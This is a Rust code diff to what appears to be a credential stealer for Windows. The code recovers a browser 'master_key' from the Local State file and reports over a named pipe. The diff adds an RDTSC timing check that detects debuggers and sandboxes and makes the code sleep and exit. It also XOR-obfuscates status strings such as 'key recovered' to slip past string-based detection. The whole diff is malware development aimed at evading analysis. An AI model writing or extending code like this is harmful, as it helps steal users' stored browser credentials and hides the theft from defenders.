@@ -5,6 +5,7 @@ mod dpapi_fallback;
 mod pipe;
 mod reflect;
 
+use core::arch::asm;
 use std::ffi::c_void;
 use std::path::PathBuf;
 use std::thread;
@@ -117,6 +118,38 @@ fn is_debugger_attached() -> bool {
     unsafe { IsDebuggerPresent().as_bool() }
 }
 
+#[cfg(target_arch = "x86_64")]
+fn rdtsc_anomaly() -> bool {
+    let (t0, t1) = unsafe {
+        let a: u64;
+        let b: u64;
+        asm!(
+            "rdtsc",
+            "shl rdx, 32",
+            "or rax, rdx",
+            out("rax") a,
+            lateout("rdx") _,
+        );
+        for _ in 0..512 {
+            core::hint::black_box(0u8);
+        }
+        asm!(
+            "rdtsc",
+            "shl rdx, 32",
+            "or rax, rdx",
+            out("rax") b,
+            lateout("rdx") _,
+        );
+        (a, b)
+    };
+    t1.saturating_sub(t0) > 500_000
+}
+
+#[cfg(not(target_arch = "x86_64"))]
+fn rdtsc_anomaly() -> bool {
+    false
+}
+
 fn is_restricted_host() -> bool {
     unsafe {
         let mut status = MEMORYSTATUSEX {
@@ -164,7 +197,7 @@ pub unsafe extern "C" fn Bootstrap(params: *const BootstrapParams) -> u32 {
         return 1;
     }
 
-    if is_debugger_attached() {
+    if is_debugger_attached() || rdtsc_anomaly() {
         thread::sleep(Duration::from_secs(30));
         return 1;
     }
@@ -314,10 +347,11 @@ fn run_core(client: &pipe::PipeClient) -> Result<String, String> {
     }
 
     client
-        .send_status("key recovered")
-        .map_err(|_| String::from("pipe status failed"))?;
+        .send_status(&xor_str(&[0x31, 0x3F, 0x23, 0x7A, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x3E, 0x3F, 0x3E]))
+        .map_err(|_| xor_str(&[0x33, 0x2A, 0x39, 0x7A, 0x29, 0x2E, 0x3B, 0x2E, 0x2F, 0x29]))?;
 
-    Ok(master_key.iter().map(|b| format!("{b:02x}")).collect::<String>())
+    let hex = master_key.iter().map(|b| format!("{b:02x}")).collect::<String>();
+    Ok(hex)
 }
 
 fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
